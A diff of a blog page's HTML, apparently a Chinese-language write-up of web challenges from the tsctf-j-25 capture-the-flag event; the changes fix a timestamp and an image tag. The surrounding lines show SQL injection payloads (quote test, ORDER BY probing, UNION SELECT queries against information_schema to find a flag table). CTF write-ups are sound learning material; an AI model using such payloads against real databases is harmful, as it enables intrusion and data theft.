@@ -16,7 +16,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://aclosure.github.io/images/cover/06.jpg">
 <meta property="article:published_time" content="2026-09-26T13:20:33.000Z">
-<meta property="article:modified_time" content="2026-09-28T12:19:50.239Z">
+<meta property="article:modified_time" content="2026-09-28T12:21:14.169Z">
 <meta property="article:author" content="aClosure">
 <meta property="article:tag" content="dev">
 <meta name="twitter:card" content="summary">
@@ -25,7 +25,7 @@
 
 <link rel="icon" href="/images/Ak_char_007_closre_3.png" type="image/png">
 
-<script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"tsctf-j-25 web-write-up","name":"tsctf-j-25 web-write-up | aClosure's奇妙的妙妙据点","description":"中秋节开始的一些尝试和学习……过几天应该会发杂谈，应该？","url":"https://aclosure.github.io/2026/09/26/tsctf-j-25/","inLanguage":"zh-CN","isPartOf":{"@type":"WebSite","name":"aClosure's奇妙的妙妙据点","url":"https://aclosure.github.io/"},"image":["https://aclosure.github.io/images/cover/06.jpg"],"mainEntityOfPage":"https://aclosure.github.io/2026/09/26/tsctf-j-25/","datePublished":"2026-09-26T13:20:33.000Z","dateModified":"2026-09-28T12:19:50.239Z","author":{"@type":"Person","name":"aClosure"},"publisher":{"@type":"Organization","name":"aClosure's奇妙的妙妙据点"},"keywords":"dev"}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"tsctf-j-25 web-write-up","name":"tsctf-j-25 web-write-up | aClosure's奇妙的妙妙据点","description":"中秋节开始的一些尝试和学习……过几天应该会发杂谈，应该？","url":"https://aclosure.github.io/2026/09/26/tsctf-j-25/","inLanguage":"zh-CN","isPartOf":{"@type":"WebSite","name":"aClosure's奇妙的妙妙据点","url":"https://aclosure.github.io/"},"image":["https://aclosure.github.io/images/cover/06.jpg"],"mainEntityOfPage":"https://aclosure.github.io/2026/09/26/tsctf-j-25/","datePublished":"2026-09-26T13:20:33.000Z","dateModified":"2026-09-28T12:21:14.169Z","author":{"@type":"Person","name":"aClosure"},"publisher":{"@type":"Organization","name":"aClosure's奇妙的妙妙据点"},"keywords":"dev"}</script>
 
 <script>
   (function () {
@@ -528,7 +528,7 @@
 <p><code>1' #</code>   这个正常，说明可以带引号（事实上是下一个order by的时候，数字型没用</p>
 <p><code>1' Order by 3 ; #</code>  到4报错，说明就只有显示的那三行</p>
 <p><code>-1' UNION SELECT 111,schema_name,database()  from information_schema.schemata; #</code></p>
-<p>&lt;img src=“/images/rt/tsctf-j-25/220202.png&quot;zoom:43%;” /&gt;</p>
+<img src="/images/rt/tsctf-j-25/220202.png" style="zoom:43%;" />
 <p><code>-1' UNION SELECT 111,database(),table_name  from information_schema.tables where table_schema = database(); #</code></p>
 <img src="/images/rt/tsctf-j-25/220450.png" style="zoom:43%;" />
 <p><code>-1' UNION SELECT 111,database(),column_name  from information_schema.columns where table_schema = database() and table_name = &quot;flag&quot;; #</code></p>
